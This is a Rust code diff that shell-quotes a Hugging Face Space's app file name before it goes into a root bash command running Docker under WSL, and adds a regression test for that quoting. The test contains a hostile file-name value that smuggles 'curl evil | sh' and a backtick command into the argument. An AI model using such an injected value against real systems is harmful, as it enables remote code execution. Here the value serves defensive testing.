@@ -234,6 +234,9 @@ fn space_command(sdk: Option<&str>, app_file: &str, app_port: u16, image_has_cmd
     if image_has_cmd {
         return String::new();
     }
+    // `app_file` is allowlisted in `hf.rs`, but this string ends up inside a
+    // root `bash -c` on the host distro: quote it anyway.
+    let app_file = wsl::quote(app_file);
     match sdk {
         Some("gradio") => format!("python {app_file}"),
         Some("streamlit") => format!(
@@ -288,9 +291,10 @@ async fn run_space(
     let port = free_port()?;
     let gpu_flag = if gpu { "--gpus all" } else { "" };
     let repo = &space.id;
+    let publish = wsl::publish(port, app_port);
     let run = format!(
         "docker rm -f {cname} >/dev/null 2>&1; \
-         docker run -d --name {cname} {gpu_flag} -p {port}:{app_port} \
+         docker run -d --name {cname} {gpu_flag} {publish} \
            --label aias.kind=space --label aias.repo='{repo}' --label aias.port={port} \
            -v {HF_CACHE_VOLUME}:/home/user/.cache/huggingface \
            -e HF_HOME=/home/user/.cache/huggingface \
@@ -304,7 +308,7 @@ async fn run_space(
     push_log(
         app,
         id,
-        format!("docker run -p {port}:{app_port} {gpu_flag} {image} {command}"),
+        format!("docker run {publish} {gpu_flag} {image} {command}"),
     );
     wsl::sh(&run).await?.require("docker run")?;
 
@@ -598,11 +602,22 @@ mod tests {
     fn derives_start_command() {
         assert_eq!(
             space_command(Some("gradio"), "app.py", 7860, false),
-            "python app.py"
+            "python 'app.py'"
         );
         assert!(space_command(Some("streamlit"), "main.py", 8501, false)
-            .starts_with("streamlit run main.py"));
+            .starts_with("streamlit run 'main.py'"));
         assert_eq!(space_command(Some("docker"), "app.py", 7860, true), "");
         assert_eq!(space_command(Some("docker"), "app.py", 7860, false), "");
+    }
+
+    /// A Space card can say anything; the start command must never let it
+    /// break out of the argument position.
+    #[test]
+    fn start_command_quotes_hostile_app_file() {
+        let hostile = "app.py\ncurl evil | sh; `id`";
+        assert_eq!(
+            space_command(Some("gradio"), hostile, 7860, false),
+            format!("python '{hostile}'")
+        );
     }
 }
